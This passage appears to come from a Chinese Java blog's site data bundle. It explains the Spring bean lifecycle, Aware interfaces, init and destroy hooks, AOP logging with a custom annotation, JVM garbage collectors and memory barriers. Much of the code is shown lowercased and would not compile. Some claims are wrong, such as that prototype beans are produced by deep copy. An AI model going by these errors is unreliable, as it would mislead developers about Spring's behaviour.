2、实例化对象\n\ndocreatebean方法创建实例，用反射技术创建，这个没什么好说的，只是相当于new了一个对象出来而已，但需要注意的是，这个时候只是将对象实例化了，对象内的属性还未设置；\n\n\n# 3、实例化后置\n\n方法名称： instantiationawarebeanpostprocessor.postprocessafterinstantiation(object bean, string beanname)\n\n在目标对象实例化之后调用，这个时候对象已经被实例化，但是该实例的属性还未被设置，都是null。因为他的返回值是决定要不要调用postprocesspropertyvalues方法中的一个因素(因为还有一个因素是mbd.getdependencycheck());\n\n返回false ：如果该方法返回false，并且不需要check，那么postprocesspropertyvalues就会被忽略不执行；\n\n返回true ： 如果返回true，postprocesspropertyvalues就会被执行\n\n\n# 4、属性修改\n\n方法名称 ：instantiationawarebeanpostprocessor.propertyvalues postprocesspropertyvalues(propertyvalues pvs, propertydescriptor[] pds, object bean, string beanname)\n\n此方法可对属性值进行修改，修改范围包括添加、修改、删除操作；，如果实例化后置 postprocessafterinstantiation() 方法返回false，那么该方法不会被调用；\n\n\n# 5、给用户属性赋值\n\n用户属性指的是用spring 的人自定义的bean对象属性，像 user、student、teacher 、userservice、indexservice 这类的对象都是自定义bean对象，第5步主要给这类属性进行赋值操作，使用的是  abstractautowirecapablebeanfactory.populatebean() 方法进行赋值；\n\n\n# 6、给容器属性赋值\n\n容器属性其实就是容器自带的属性，这些属性都是spring本来就有的；可以肯定的是，它们都是 aware 接口的实现类，主要有以下实现类，我已经将它们的执行顺序都排列好了，\n\n\n\n我们先看看怎么用，然后再来讲解每个aware的作用；上代码\n\npackage com.spring.boot.init.aware;\n \nimport org.springframework.beans.beansexception;\nimport org.springframework.beans.factory.beanclassloaderaware;\nimport org.springframework.beans.factory.beanfactory;\nimport org.springframework.beans.factory.beanfactoryaware;\nimport org.springframework.beans.factory.beannameaware;\nimport org.springframework.context.*;\nimport org.springframework.context.annotation.importaware;\nimport org.springframework.context.weaving.loadtimeweaveraware;\nimport org.springframework.core.env.environment;\nimport org.springframework.core.io.resourceloader;\nimport org.springframework.core.type.annotationmetadata;\nimport org.springframework.instrument.classloading.loadtimeweaver;\nimport org.springframework.stereotype.component;\nimport org.springframework.util.stringvalueresolver;\nimport org.springframework.web.context.servletcontextaware;\nimport javax.servlet.servletcontext;\n \n@component\npublic class allawareinterface  implements beannameaware, beanclassloaderaware,\n        beanfactoryaware, environmentaware, embeddedvalueresolveraware,\n        resourceloaderaware, applicationeventpublisheraware, messagesourceaware,\n        applicationcontextaware, servletcontextaware, loadtimeweaveraware, importaware {\n \n    @override\n    public void setbeanname(string name) {\n        // beannameaware作用：让bean对name有知觉\n        //这个方法只是简单的返回我们当前的beanname,听官方的意思是这个接口更多的使用在spring的框架代码中，实际开发环境应该不建议使用\n        system.out.println("1 我是 beannameaware 的 setbeanname 方法  ---参数：name，内容："+ name);\n    }\n    @override\n    public void setbeanclassloader(classloader classloader) {\n        system.out.println("2 我是 beanclassloaderaware 的 setbeanclassloader 方法");\n    }\n    @override\n    public void setbeanfactory(beanfactory beanfactory) throws beansexception {\n        // 注意： 如果使用 @configuration 注解的话，setbeanfactory方法会执行2次，\n        system.out.println("3 我是 beanfactoryaware 的 setbeanfactory 方法");\n    }\n    @override\n    public void setenvironment(environment environment) {\n        system.out.println("4 我是 environmentaware 的 setenvironment 方法");\n    }\n    @override\n    public void setembeddedvalueresolver(stringvalueresolver stringvalueresolver) {\n        system.out.println("5 我是 embeddedvalueresolveraware 的 setembeddedvalueresolver 方法");\n    }\n    @override\n    public void setresourceloader(resourceloader resourceloader) {\n        system.out.println("6 我是 resourceloaderaware 的 setresourceloader 方法");\n    }\n    @override\n    public void setapplicationeventpublisher(applicationeventpublisher applicationeventpublisher) {\n        system.out.println("7 我是 applicationeventpublisheraware 的 setapplicationeventpublisher 方法");\n    }\n    @override\n    public void setmessagesource(messagesource messagesource) {\n        system.out.println("8 我是 messagesourceaware 的 setmessagesource 方法");\n    }\n    @override\n    public void setapplicationcontext(applicationcontext applicationcontext) throws beansexception {\n        system.out.println("9 我是 applicationcontextaware 的 setapplicationcontext 方法");\n    }\n    @override\n    public void setservletcontext(servletcontext servletcontext) {\n        system.out.println("10 我是 servletcontextaware 的 setservletcontext 方法");\n    }\n    @override\n    public void setloadtimeweaver(loadtimeweaver loadtimeweaver) {\n        //loadtimeweaver 简称ltw，ltw是aop的一种实现方式，此方法是为了获取aop织入的对象，使用的织入方式是：类加载期织入，\n        // 一般的aop都是运行期织入，就是在运行的时候才进行织入切面方法，但是ltw是在类加载前就被织入了，也就是class文件在jvm加载之前进行织入切面方法\n        // 只有在使用 @enableloadtimeweaving 或者存在 loadtimeweaver 实现的 bean 时才会调用，顺序也很靠后\n        system.out.println("11 我是 loadtimeweaveraware 的 setloadtimeweaver 方法");\n    }\n    @override\n    public void setimportmetadata(annotationmetadata annotationmetadata) {\n        //只有被其他配置类 @import(xx.class) 时才会调用，这个调用对 xx.class 中的所有 @bean 来说顺序是第 1 的。\n        system.out.println("12 我是 importaware 的 setimportmetadata 方法");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n\n\n启动spring后的控制台打印的部分结果如下：\n\n\n\n可以看到它们的输出结果按照顺序依次排列打印出来了，这就是它的标准顺序了；接下来我们了解下它们的具体作用\n\n\n# 6.1  beannameaware.setbeanname()\n\n这个方法只是简单的返回我们当前的beanname,听官方的意思是这个接口更多的使用在spring的框架代码中，实际开发环境应该不建议使用\n\n\n# 6.2  beanclassloaderaware.setbeanclassloader()\n\n获取bean的类装载器，\n\n\n# 6.3 beanfactoryaware.setbeanfactory()\n\n获取bean工厂，beanfactory让你可以不依赖注入方式，随意的读取ioc容器里面的对象，不过beanfactory本身还是要注入的。\n\n需要注意的是，一般情况下我们都用  @component 注解，如果使用 @configuration 注解的话，setbeanfactory方法会执行2次；\n\n\n# 6.4 environmentaware.setenvironment()\n\n实现了environmentaware接口重写setenvironment方法后，在工程启动时可以获得application.properties 、xml、yml 的配置文件配置的属性值。\n\n\n# 6.5  embeddedvalueresolveraware.setembeddedvalueresolver()\n\n通常我们使用@value注解来获取properties 和 yml 文件中的值，每个类中都要使用@value也很繁琐，实现embeddedvalueresolveraware接口后就方便多了。用法也跟@value一样，需要用${}包裹住；\n\n@component   \npublic class propertiesutil implements embeddedvalueresolveraware {\n \n\t@override\n\tpublic void setembeddedvalueresolver(stringvalueresolver stringvalueresolver) {   \n     system.out.println(stringvalueresolver.resolvestringvalue("${logging.file}"));\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 6.6 resourceloaderaware.setresourceloader()\n\nspring resourceloader为我们提供了一个统一的getresource()方法来通过资源路径检索外部资源。从而将资源或文件(例如文本文件、xml文件、属性文件或图像文件)加载到spring应用程序上下文中的不同实现 ，其实说白了，就是用来加载外部资源的；方法中有个参数：resourceloader ，这个参数其实就是applicationcontext（spring 的上下文对象）；可直接强转；\n\npackage org.crazyit.app.service;\nimport org.springframework.context.resourceloaderaware;\nimport org.springframework.core.io.resourceloader;\npublic class testbean implements resourceloaderaware{\n   \n    public void setresourceloader(resourceloader resourceloader) {\n        // 可直接强转为 applicationcontext\n        applicationcontext context = (applicationcontext) resourceloader;\n \n        system.out.println("6 我是 resourceloaderaware 的 setresourceloader 方法");\n    }\n   \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n并且我们可以指定不同的前缀来创建路径以从不同位置加载资源\n\n\n\n\n# 6.7 applicationeventpublisheraware.setapplicationeventpublisher()；\n\napplicationeventpublisheraware是一个事件发布器的接口，使用这个接口，我们自己的 service 就拥有了发布事件的能力。用户注册后，不再是显示调用其他的业务 service，而是发布一个用户注册事件。那么在这里是发布事件，那就肯定有监听事件的接口，这个接口叫做 applicationlistener <e extends applicationevent > ，只要实现 applicationlistener 接口就可以接受发布的事件了，接下来我们写一个示例来模拟发布事件和监听事件；\n\n先创建一个实体类，用来存储发布的事件内容   stringevent.java\n\npackage com.spring.boot.init.listener.eventmodel;\nimport org.springframework.context.applicationevent;\n//事件监听对象\npublic class stringevent extends applicationevent {\n \n    private string str;\n    // 构造函数\n    public stringevent(object source) {\n        super(source);\n        str = source.tostring();\n    }\n    // 获取字符串\n    public string getstr(){\n        return str;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n创建一个发布事件的类：extapplicationeventpublisheraware.java ，实现 applicationeventpublisheraware  接口增加发布事件的功能；\n\npackage com.spring.boot.init.aware;\n \nimport com.spring.boot.init.listener.eventmodel.stringevent;\nimport org.springframework.context.applicationeventpublisher;\nimport org.springframework.context.applicationeventpublisheraware;\nimport org.springframework.stereotype.component;\n \n/**\n * 发布事件\n */\n@component\npublic class extapplicationeventpublisheraware implements applicationeventpublisheraware {\n    @override\n    public void setapplicationeventpublisher(applicationeventpublisher applicationeventpublisher) {\n        system.out.println("发布事件，事件对象为 stringevent ，内容为 ：1234");\n        stringevent stringevent = new stringevent("1234");\n        // 发布事件 ，发布后会在 applicationlistener.onapplicationevent()方法进行捕获；\n        applicationeventpublisher.publishevent(stringevent);  // 发布事件\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n在创建一个事件监听器：  eventlistener.java ，用来监听所有发布的事件；\n\npackage com.spring.boot.init.listener;\n \n \nimport com.spring.boot.init.listener.eventmodel.stringevent;\nimport org.springframework.context.applicationevent;\nimport org.springframework.context.applicationlistener;\nimport org.springframework.stereotype.component;\n \n//事件监听器\n@component\npublic class eventlistener implements applicationlistener<stringevent> {\n \n    @override\n    public void onapplicationevent(stringevent o) {\n        system.out.println("监听到事件，内容："+o.getstr());\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n接下来，运行spring项目，看看打印的结果如下，到这里，事件的发布和监听就完成了；\n\n\n\n\n# 6.8 messagesourceaware.setmessagesource()\n\n国际化消息通知操作\n\n\n# 6.9 applicationcontextaware.setapplicationcontext()\n\napplicationcontextaware 主要用来全局获取 applicationcontext 上下文，applicationcontext其实就是容器，为此我们可以实现 applicationcontextaware 接口来获取applicationcontext容器对象；我们可以把它做成一个公共的静态类，这样可以在任意地方想拿就拿了，\n\npackage com.spring.boot.init.aware;\n \nimport org.springframework.beans.beansexception;\nimport org.springframework.context.applicationcontext;\nimport org.springframework.context.applicationcontextaware;\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.stereotype.component;\n \n@component\npublic class extapplicationcontextaware implements applicationcontextaware {\n \n    /**\n     * spring容器会在加载完spring容器后调用applicationcontextaware.setapplicationcontext方法\n     * applicationcontextaware 主要用来全局获取 applicationcontext 上下文，\n     */\n \n    private static applicationcontext applicationcontext;\n \n    @override\n    public void setapplicationcontext(applicationcontext applicationcontext) throws beansexception {\n        if (extapplicationcontextaware.applicationcontext == null) {\n            extapplicationcontextaware.applicationcontext = applicationcontext;\n        }\n        system.out.println("========applicationcontext配置成功========");\n        system.out.println("========在普通类可以通过调用springbootbeanutil.getapplicationcontext()获取applicationcontext对象========");\n        system.out.println("========applicationcontext="+ extapplicationcontextaware.applicationcontext +"========");\n    }\n \n    /**\n     * 获取applicationcontext\n     * @return\n     */\n    public static applicationcontext getapplicationcontext() {\n        return applicationcontext;\n    }\n \n    /**\n     * 通过name获取 bean.\n     * @param name\n     * @return\n     */\n    public static object getbean(string name) {\n        return getapplicationcontext().getbean(name);\n    }\n \n    /**\n     * 通过class获取bean.\n     * @param clazz\n     * @return\n     */\n    public static <t> t getbean(class<t> clazz) {\n        return getapplicationcontext().getbean(clazz);\n    }\n \n    /**\n     * 通过name,以及clazz返回指定的bean\n     * @param name\n     * @param clazz\n     * @return\n     */\n    public static <t> t getbean(string name, class<t> clazz) {\n        return getapplicationcontext().getbean(name, clazz);\n    }\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n\n\n当然，也可以直接注入，就像这样：\n\n @autowired\n private applicationcontext applicationcontext;\n\n\n1\n2\n\n\n\n# 6.10 servletcontextaware.setservletcontext()\n\n通过实现servletcontextaware接口可获取servletcontext，也就是servlet的上下文；\n\n什么是servletcontext ： web容器在启动时，它会为每个web应用程序都创建一个对应的servletcontext对象，它代表当前web应用。servletconfig对象中维护了servletcontext对象的引用，开发人员在编写servlet时，可以通过servletconfig.getservletcontext方法获得servletcontext对象。 由于一个web应用中的所有servlet共享同一个servletcontext对象，因此servlet对象之间可以通过servletcontext对象来实现通讯。servletcontext对象通常也被称之为context域对象。\n\n\n# 6.11 loadtimeweaveraware.setloadtimeweaver()\n\n其实在调试的时候还有2个没打印出来，第11个就是 loadtimeweaver， 简称ltw，ltw是aop的一种实现方式，此方法是为了获取aop织入的对象，使用的织入方式是：类加载期织入， 一般的aop都是运行期织入，就是在运行的时候才进行织入切面方法，但是ltw是在类加载前就被织入了，也就是class文件在jvm加载之前进行织入切面方法 只有在使用 @enableloadtimeweaving 或者存在 loadtimeweaver 实现的 bean 时才会调用，顺序也很靠后;\n\n\n# 6.12  importaware.setimportmetadata()\n\n还有一个没打印的就是importaware接口，这个接口的方法只有被其他配置类 @import(xx.class) 时才会调用，这个调用对 xx.class 中的所有 @bean 来说顺序是第 1 的。\n\n\n# 7、初始化前置\n\n方法名称： beanpostprocessor.postprocessbeforeinitialization()\n\n在每一个 bean 初始化之前执行的方法（有多少 bean 调用多少次）\n\n注意 ： 启用该方法后，标注了@postconstruct注解的方法会失效\n\n\n# 8、初始化后置\n\n方法名称： beanpostprocessor.postprocessafterinitialization()\n\n在每一个 bean 初始化之后执行的方法（有多少 bean 调用多少次）\n\n初始化前置和初始化后置的实现代码如下\n\npackage com.spring.boot.init;\nimport org.springframework.beans.beansexception;\nimport org.springframework.beans.factory.config.beanpostprocessor;\nimport org.springframework.stereotype.component;\n \n@component\npublic class extbeanpostprocessor implements beanpostprocessor {\n    @override\n    public object postprocessbeforeinitialization(object bean, string beanname) throws beansexception {\n        // 在每一个 bean 初始化之前执行的方法（有多少 bean 调用多少次）\n        // 注意 ： 启用该方法后，标注了@postconstruct注解的方法会失效\n        system.out.println("初始化前置方法");\n        return null;\n    }\n    @override\n    public object postprocessafterinitialization(object bean, string beanname) throws beansexception {\n         在每一个 bean 初始化之后执行的方法（有多少 bean 调用多少次）\n        system.out.println("初始化后置方法");\n        return null;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 9、执行初始化方法\n\n初始化方法有三个，分别是 添加了@postconstruct 注解的方法、实现initializingbean接口、在@bean注解上添加 initmethod属性；我们一个个讲\n\n\n# 9.1 初始化方法一：@postconstruct\n\n在bean对象内添加@postconstruct 注解后即可实现初始化的功能，被@postconstruct修饰的方法会在构造函数之后，init()方法之前运行。 有多个则会执行多次；\n\n注意： 如果spring 实现了 beanpostprocessor接口的postprocessbeforeinitialization() 方法，也就是12的初始后置方法，那么@postconstruct注解会失效；\n\n代码示例\n\npackage com.spring.boot.init;\nimport org.springframework.stereotype.component;\nimport javax.annotation.postconstruct;\n \n// @postconstruct注解\n@component\npublic class extpostconstruct {\n \n    /**\n     * 被@postconstruct修饰的方法会在构造函数之后，init()方法之前运行。如果有多个则会执行多次\n     * 注意： 如果spring 实现了 beanpostprocessor接口的postprocessbeforeinitialization方法，该@postconstruct注解会失效\n     */\n    @postconstruct\n    public void init() {\n        system.out.println("第一个init...");\n    }\n \n    // 有多个会执行多次\n    @postconstruct\n    public void init1() {\n        system.out.println("第二个init1...");\n    }\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# 9.2 initializingbean.afterpropertiesset()\n\nspring 初始化方法之一，作用是在beanfactory完成属性设置之后,执行自定义的初始化行为。\n\n执行顺序：在initmethod之前执行，在@postconstruct之后执行\n\n代码示例\n\npackage com.spring.boot.init;\nimport org.springframework.beans.factory.initializingbean;\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.stereotype.component;\n \n@component\npublic class extinitializingbean implements initializingbean {\n    @override\n    public void afterpropertiesset() throws exception {\n        // 一个 initializingbean 执行一次\n        // spring 初始化方法，作用是在beanfactory完成属性设置之后,执行自定义的  初始化行为.\n        // 执行顺序：在initmethod之前执行，在@postconstruct之后执行\n        system.out.println("initializingbean");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 9.3 init-method\n\nbean 配置文件属性 init-method 用于在bean初始化时指定执行方法，用来替代继承 initializingbean接口,\n\n注意的一点是只有一个类完整的实例被创建出来后，才能走初始化方法。\n\n示例代码，先定义一个类： beantest.java ，在类中定义一个初始化方法 initmethod_1()\n\npackage com.spring.boot.init.bean;\n \npublic class beantest {\n    \n    // 将要执行的初始化方法\n    public void initmethod_1(){\n        system.out.println("我是beantest的init方法");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nxml 配置方式\n\n<bean id="beantest" class="com.beantest" init-method="init"></bean> \n\n\n1\n\n\n注解配置方式\n\npackage com.spring.boot.init;\nimport com.spring.boot.init.bean.beantest;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.stereotype.component;\n@component()\npublic class initmethod  {\n    \n    // 在@bean注解上添加initmethod属性，指向类中的 initmethod_1 执行初始化方法\n    @bean(initmethod = "initmethod_1")\n    public beantest getbeantest(){\n        return new beantest();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 10、使用中\n\n到这一步，bean对象就已经完全创建好了，是一个完整对象了，并且正在被其他对象使用了；\n\n\n# 11、销毁流程\n\n在这里需要先说一下，被spring容器管理的bean默认是单例的，默认在类上面有个 @scope注解，也就是这样的\n\npackage com.spring.boot.init;\n \nimport org.springframework.beans.factory.config.configurablebeanfactory;\nimport org.springframework.context.annotation.scope;\nimport org.springframework.stereotype.component;\n \n@component()\n@scope(value = configurablebeanfactory.scope_singleton)\n// @scope(value = "singleton")  // 也可以这样写\npublic class initmethod  {\n \n  // methods....\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n如果要设置成多例，只需要把@scope的属性值改一下就行，就像这样，多例模式也叫原型模式，它底层不是重新创建一个bean对象出来，而是使用深拷贝技术实现的，就是复制一个对象出来进行使用\n\n@scope(value = configurablebeanfactory.scope_prototype)\n// @scope(value = "prototype") // 也可以这样写\n\n\n1\n2\n\n\n为什么要介绍单例和多例呢？ 因为啊，销毁流程的走向就跟你是单例还是多例有关；\n\n如果是单例模式，会先执行 disposablebean.destroy()方法，然后在执行 destroy-method 方法；\n\n\n# 11.1  disposablebean.destroy()\n\n单例模式的销毁方式，示例代码\n\npackage com.spring.boot.init.destroy;\n \nimport org.springframework.beans.factory.disposablebean;\nimport org.springframework.stereotype.component;\n \n/**\n * 销毁方法\n */\n@component\npublic class extdisposablebean implements disposablebean {\n    @override\n    public void destroy() throws exception {\n        system.out.println("我被销毁了");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n当结束main方法时，控制台打印的结果如下\n\n\n# 11.2  destory-method方法\n\n还是拿 第11 个流程的例子来讲，只不过这次我们在@bean注解里加上 destroymethod属性，指向销毁方法 ：destroymethod_1()\n\npackage com.spring.boot.init;\n \nimport com.spring.boot.init.bean.beantest;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.stereotype.component;\n \n@component()\npublic class initmethod  {\n \n    // 在@bean注解上添加initmethod属性，指向类中的 initmethod_1 执行初始化方法\n    // 在@bean注解上添加destroymethod属性，指向类中的 destroymethod_1 执行销毁方法\n    @bean(initmethod = "initmethod_1",destroymethod = "destroymethod_1")\n    public beantest getbeantest(){\n        return new beantest();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nbeantest.java\n\npackage com.spring.boot.init.bean;\n \npublic class beantest {\n \n    // 将要执行的初始化方法\n    public void initmethod_1(){\n        system.out.println("我是beantest的init方法");\n    }\n \n    // 将要执行的销毁方法\n    public void destroymethod_1(){\n        system.out.println("我是beantest的init方法");\n    }\n \n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nxml的配置方式\n\n<bean id="beantest" class="com.beantest" destroy-method="destroymethod_1"></bean>\n\n\n\n1\n2\n\n\n\n# 12、返回bean给用户，剩下的生命周期由用户控制\n\n因为多例模式下，spring无法进行管理，所以将生命周期交给用户控制，用户用完bean对象后，java垃圾处理器会自动将无用的对象进行回收操作；',charsets:{cjk:!0},lastUpdated:"2022/05/31, 14:41:23",lastUpdatedTimestamp:1653979283e3},{title:"自定义注解实现 AOP 日志记录",frontmatter:{title:"自定义注解实现 AOP 日志记录",date:"2022-08-10T15:50:10.000Z",permalink:"/pages/9f6f65/",categories:["java","spring"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/04.spring/17.%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3%E5%AE%9E%E7%8E%B0%20AOP%20%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95.html",relativePath:"04.java/04.spring/17.自定义注解实现 AOP 日志记录.md",key:"v-a25fe6de",path:"/pages/9f6f65/",headersStr:null,content:'> 本文原文地址 blog.csdn.net\n\n 1. 引入 jar 包\n\n<dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-aop</artifactId>\n        </dependency>\n\n\n1\n2\n3\n4\n\n 2. 创建自定义注解\n\n@Target(ElementType.METHOD)\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface MyLog {\n\n}\n\n\n1\n2\n3\n4\n5\n\n 3. 定义切面\n\n@Aspect // 1.表明这是一个切面类\n@Component\npublic class MyLogAspect {\n\n    // 2. PointCut表示这是一个切点，@annotation表示这个切点切到一个注解上，后面带该注解的全类名\n    // 切面最主要的就是切点，所有的故事都围绕切点发生\n    // logPointCut()代表切点名称\n    @Pointcut("@annotation(com.example.mimsmes.Service.Report.MyLog)")\n    public void logPointCut(){};\n\n    // 3. 环绕通知\n    @Around("logPointCut()")\n    public void logAround(ProceedingJoinPoint joinPoint){\n        // 获取方法名称\n        String methodName = joinPoint.getSignature().getName();\n        // 获取入参\n        Object[] param = joinPoint.getArgs();\n\n        StringBuilder sb = new StringBuilder();\n        for(Object o : param){\n            sb.append(o + "; ");\n        }\n        System.out.println("进入[" + methodName + "]方法,参数为:" + sb.toString());\n\n        // 继续执行方法\n        try {\n            joinPoint.proceed();\n        } catch (Throwable throwable) {\n            throwable.printStackTrace();\n        }\n        System.out.println(methodName + "方法执行结束");\n\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n 4. 使用注解\n    \n    控制台运行后\n    \n    ',normalizedContent:'> 本文原文地址 blog.csdn.net\n\n 1. 引入 jar 包\n\n<dependency>\n            <groupid>org.springframework.boot</groupid>\n            <artifactid>spring-boot-starter-aop</artifactid>\n        </dependency>\n\n\n1\n2\n3\n4\n\n 2. 创建自定义注解\n\n@target(elementtype.method)\n@retention(retentionpolicy.runtime)\npublic @interface mylog {\n\n}\n\n\n1\n2\n3\n4\n5\n\n 3. 定义切面\n\n@aspect // 1.表明这是一个切面类\n@component\npublic class mylogaspect {\n\n    // 2. pointcut表示这是一个切点，@annotation表示这个切点切到一个注解上，后面带该注解的全类名\n    // 切面最主要的就是切点，所有的故事都围绕切点发生\n    // logpointcut()代表切点名称\n    @pointcut("@annotation(com.example.mimsmes.service.report.mylog)")\n    public void logpointcut(){};\n\n    // 3. 环绕通知\n    @around("logpointcut()")\n    public void logaround(proceedingjoinpoint joinpoint){\n        // 获取方法名称\n        string methodname = joinpoint.getsignature().getname();\n        // 获取入参\n        object[] param = joinpoint.getargs();\n\n        stringbuilder sb = new stringbuilder();\n        for(object o : param){\n            sb.append(o + "; ");\n        }\n        system.out.println("进入[" + methodname + "]方法,参数为:" + sb.tostring());\n\n        // 继续执行方法\n        try {\n            joinpoint.proceed();\n        } catch (throwable throwable) {\n            throwable.printstacktrace();\n        }\n        system.out.println(methodname + "方法执行结束");\n\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n 4. 使用注解\n    \n    控制台运行后\n    \n    ',charsets:{cjk:!0},lastUpdated:"2022/05/31, 14:41:23",lastUpdatedTimestamp:1653979283e3},{title:"垃圾收集器_",frontmatter:{title:"垃圾收集器_",date:"2022-04-17T23:21:45.000Z",permalink:"/pages/e78c12/",categories:["java","jvm"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/05.jvm/01.%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E5%99%A8_.html",relativePath:"04.java/05.jvm/01.垃圾收集器_.md",key:"v-7f24de41",path:"/pages/e78c12/",headersStr:null,content:"垃圾收集器               单/多线程   新生代                                                 老生代                                                 其他特性\nSerial              单线程     标记-复制                                               标记-整理                                               没有线程切换开销，适合客户端，老年代版本为Serial Old\nParNew              多线程     标记-复制                                               标记-整理                                               多线程整理，但是会阻塞用户线程，老年代版本：Parallel Scavenge\nParallel Scavenge   多线程     标记-复制                                               标记-整理                                               关注吞吐量 （用户线程执行时间/总时间），除了可以自己配置参数，还能自适应调节\nCMS 收集器             多线程     -                                                   标记-清除                                               用户线程可以和CMS线程一起执行\nG1                  多线程     G1 从整体来看是基于“标记-整理”算法实现的收集器；从局部上来看是基于“标记-复制”算法实现的。   G1 从整体来看是基于“标记-整理”算法实现的收集器；从局部上来看是基于“标记-复制”算法实现的。   能够和用户线程一起执行，可预设置停顿时长",normalizedContent:"垃圾收集器               单/多线程   新生代                                                 老生代                                                 其他特性\nserial              单线程     标记-复制                                               标记-整理                                               没有线程切换开销，适合客户端，老年代版本为serial old\nparnew              多线程     标记-复制                                               标记-整理                                               多线程整理，但是会阻塞用户线程，老年代版本：parallel scavenge\nparallel scavenge   多线程     标记-复制                                               标记-整理                                               关注吞吐量 （用户线程执行时间/总时间），除了可以自己配置参数，还能自适应调节\ncms 收集器             多线程     -                                                   标记-清除                                               用户线程可以和cms线程一起执行\ng1                  多线程     g1 从整体来看是基于“标记-整理”算法实现的收集器；从局部上来看是基于“标记-复制”算法实现的。   g1 从整体来看是基于“标记-整理”算法实现的收集器；从局部上来看是基于“标记-复制”算法实现的。   能够和用户线程一起执行，可预设置停顿时长",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"内存屏障",frontmatter:{title:"内存屏障",date:"2022-04-17T22:22:39.000Z",permalink:"/pages/ecc12f/",categories:["java"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/05.jvm/02.%E5%86%85%E5%AD%98%E5%B1%8F%E9%9A%9C.html",relativePath:"04.java/05.jvm/02.内存屏障.md",key:"v-2c42ce1d",path:"/pages/ecc12f/",headersStr:null,content:"# 内存屏障的由来\n\n对于CPU的写，目前主流策略有两种：\n\n1、write back：即CPU向内存写数据时，先把真实数据放入store buffer中，待到某个合适的时间点，CPU才会将store buffer中的数据刷到内存中，而且这两个操作是异步的。这在多线程环境中，有些情况下是可以接受的，但是有些情况是不可接受的，为了让程序员有能力根据业务需要达到同步完成，就设计了内存屏障。关于内存屏障，后面会细讲。\n\n2、write through：即CPU向内存写数据时，同步完成写store buffer与内存。\n\n当前CPU大多数采用的是write back策略。因为大多数情况下，CPU异步完成写内存产生的部分延迟是可以接受的，而且这个延迟极短。 只有在多线程环境下需要严格保证内存可见等极少数特殊情况下才需要保证CPU的写在外界看来是同步完成的，需要借助CPU提供的内存屏障实现。如果直接采用策略2：write through，那每次写内存都需要等待数据刷入内存，极大影响了CPU的执行效率。\n\n\n# 内存屏障到底是什么？\n\n内存屏障什么都不是，它只是一个抽象概念，就像OOP。如果这样说你不理解，那你把他理解成一堵墙，这堵墙正面与反面的指令无法被CPU乱序执行及这堵墙正面与反面的读写操作需有序执行。",normalizedContent:"# 内存屏障的由来\n\n对于cpu的写，目前主流策略有两种：\n\n1、write back：即cpu向内存写数据时，先把真实数据放入store buffer中，待到某个合适的时间点，cpu才会将store 